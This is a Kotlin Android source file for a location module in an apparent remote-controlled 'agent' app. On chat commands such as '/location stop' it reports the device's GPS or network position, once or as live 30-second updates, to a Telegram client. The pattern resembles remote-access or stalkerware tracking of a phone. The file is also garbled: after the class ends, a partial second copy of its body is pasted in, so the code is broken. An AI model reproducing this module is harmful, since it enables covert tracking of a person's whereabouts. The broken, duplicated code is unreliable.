package com.example.agent.capabilities

import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.*
import androidx.core.content.ContextCompat
import com.example.agent.TelegramClient
import com.example.agent.ErrorReporter

class LocationCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    private val lm: LocationManager? = ctx.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
    private var trackingListener: LocationListener? = null

    private fun getLocationManager(): LocationManager? {
        if (lm == null) {
            telegram.sendText("❌ Location service not available")
        }
        return lm
    }

    @SuppressLint("MissingPermission")
    fun getOnce() {
        if (!hasLocationPermission()) {
            telegram.sendText("❌ Location permission denied")
            return
        }
        val manager = getLocationManager() ?: return
        val gps = try { manager.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: Exception) { ErrorReporter.report(e, "LocationCapability"); null }
        val net = try { manager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: Exception) { ErrorReporter.report(e, "LocationCapability"); null }
        val loc = gps ?: net

        if (loc == null) {
            telegram.sendText("📍 Location unavailable\n(GPS off or no cached location)")
            return
        }

        sendLocation(loc, "📍 Current location")
    }

    @SuppressLint("MissingPermission")
    fun startTracking() {
        if (!hasLocationPermission()) {
            telegram.sendText("❌ Location permission denied")
            return
        }
        val manager = getLocationManager() ?: return

        if (trackingListener != null) {
            telegram.sendText("Already tracking. /location stop first.")
            return
        }

        if (!manager.isProviderEnabled(LocationManager.GPS_PROVIDER) &&
            !manager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            telegram.sendText("📍 Location providers disabled. Enable GPS or Network location.")
            return
        }

        telegram.sendText("📍 Live tracking started. /location stop to cancel.")

        trackingListener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                sendLocation(loc, "📍 Live update")
            }

            @Deprecated("Deprecated in API 29")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {
                telegram.sendText("📍 Location provider disabled: $provider")
            }
        }

        try {
            manager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                30_000L, 0f,
                trackingListener!!
            )
        } catch (e: Exception) {
            telegram.sendText("📍 Failed to start GPS tracking: ${e.message}")
            ErrorReporter.report(e, "LocationCapability")
        }

        try {
            manager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                30_000L, 0f,
                trackingListener!!
            )
        } catch (e: Exception) {
            ErrorReporter.report(e, "LocationCapability")
            // Network provider might not be available
        }
    }

    fun stopTracking() {
        val manager = lm ?: run {
            telegram.sendText("Not currently tracking.")
            return
        }
        trackingListener?.let {
            manager.removeUpdates(it)
            trackingListener = null
            telegram.sendText("📍 Tracking stopped.")
        } ?: telegram.sendText("Not currently tracking.")
    }

    private fun sendLocation(loc: Location, prefix: String) {
        val lat = loc.latitude
        val lng = loc.longitude
        val acc = loc.accuracy
        val provider = loc.provider ?: "unknown"

        telegram.sendText("""
$prefix
━━━━━━━━━━━━━━━━━
Lat:      $lat
Lng:      $lng
Accuracy: ${acc}m
Provider: $provider
━━━━━━━━━━━━━━━━━
🗺️ https://maps.google.com/?q=$lat,$lng
        """.trimIndent())
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }
}

        val gps = try { lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (_: Exception) { null }
        val net = try { lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (_: Exception) { null }
        val loc = gps ?: net

        if (loc == null) {
            telegram.sendText("📍 Location unavailable\n(GPS off or no cached location)")
            return
        }

        sendLocation(loc, "📍 Current location")
    }

    @SuppressLint("MissingPermission")
    fun startTracking() {
        if (!hasLocationPermission()) {
            telegram.sendText("❌ Location permission denied")
            return
        }

        if (trackingListener != null) {
            telegram.sendText("Already tracking. /location stop first.")
            return
        }

        if (!lm.isProviderEnabled(LocationManager.GPS_PROVIDER) &&
            !lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            telegram.sendText("📍 Location providers disabled. Enable GPS or Network location.")
            return
        }

        telegram.sendText("📍 Live tracking started. /location stop to cancel.")

        trackingListener = object : LocationListener {
            override fun onLocationChanged(loc: Location) {
                sendLocation(loc, "📍 Live update")
            }

            @Deprecated("Deprecated in API 29")
            override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {
                telegram.sendText("📍 Location provider disabled: $provider")
            }
        }

        try {
            lm.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                30_000L, 0f,
                trackingListener!!
            )
        } catch (e: Exception) {
            telegram.sendText("📍 Failed to start GPS tracking: ${e.message}")
        }

        try {
            lm.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                30_000L, 0f,
                trackingListener!!
            )
        } catch (e: Exception) {
            // Network provider might not be available
        }
    }

    fun stopTracking() {
        trackingListener?.let {
            lm.removeUpdates(it)
            trackingListener = null
            telegram.sendText("📍 Tracking stopped.")
        } ?: telegram.sendText("Not currently tracking.")
    }

    private fun sendLocation(loc: Location, prefix: String) {
        val lat = loc.latitude
        val lng = loc.longitude
        val acc = loc.accuracy
        val provider = loc.provider ?: "unknown"

        telegram.sendText("""
$prefix
━━━━━━━━━━━━━━━━
Lat:      $lat
Lng:      $lng
Accuracy: ${acc}m
Provider: $provider
━━━━━━━━━━━━━━━━
🗺️ https://maps.google.com/?q=$lat,$lng
        """.trimIndent())
    }

    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(ctx, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
    }
}
